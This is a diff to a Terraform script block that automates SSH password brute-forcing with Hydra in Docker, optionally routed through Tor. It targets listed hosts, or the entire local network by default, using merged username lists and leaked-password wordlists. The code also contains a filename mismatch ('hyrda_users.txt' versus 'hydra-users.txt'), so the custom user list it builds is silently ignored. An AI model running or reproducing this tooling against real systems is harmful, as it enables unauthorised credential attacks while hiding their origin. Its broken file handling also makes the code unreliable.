@@ -26,17 +26,25 @@ locals {
     log "LOCAL_NET: $LOCAL_NET"
     log "Targets: ${join(",", var.targets)}"
     echo "${ length(var.targets) > 0 ? join(",", var.targets) : "$LOCAL_NET" }" > /tmp/hydra-targets.txt
+    cat > /tmp/hyrda_users.txt <<-EOF
+        ${join("\n", var.user_list)}
+    EOF
+    cat /opt/usernames/top-usernames-shortlist.txt >> /tmp/hyrda_users.txt
+    cat > /tmp/hydra-passwords.txt <<-EOF
+        ${join("\n", var.password_list)}
+    EOF
+    cat /opt/passwords/darkweb2017-top10.txt >> /tmp/hydra-passwords.txt
     if [[ `sudo docker ps | grep ${var.container_name}` ]]; then docker stop ${var.container_name}; fi
     ${ var.use_tor == true ? <<-EOF
         log "Using tor network..."
         sudo docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy
         TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
-        log "Running: proxychains hydra -V -L /opt/usernames/top-usernames-shortlist.txt -P /opt/passwords/darkweb2017-top10.txt -M /tmp/hydra-targets.txt ssh
-        sudo docker run --rm -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.container_name} hydra -V -L /opt/usernames/top-usernames-shortlist.txt -P /opt/passwords/darkweb2017-top10.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
+        log "Running: proxychains hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh
+        sudo docker run --rm -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.container_name} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
         EOF
         : <<-EOF
-        log "Running: hydra -V -L /opt/usernames/top-usernames-shortlist.txt -P /opt/passwords/darkweb2017-top10.txt -M /tmp/hydra-targets.txt ssh
-        sudo docker run --rm -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.container_name} -L /opt/usernames/top-usernames-shortlist.txt -P /opt/passwords/darkweb2017-top10.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
+        log "Running: hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh
+        sudo docker run --rm -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.container_name} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt ssh >> /tmp/hydra.txt 2>&1
         EOF
     }
     log "Done."
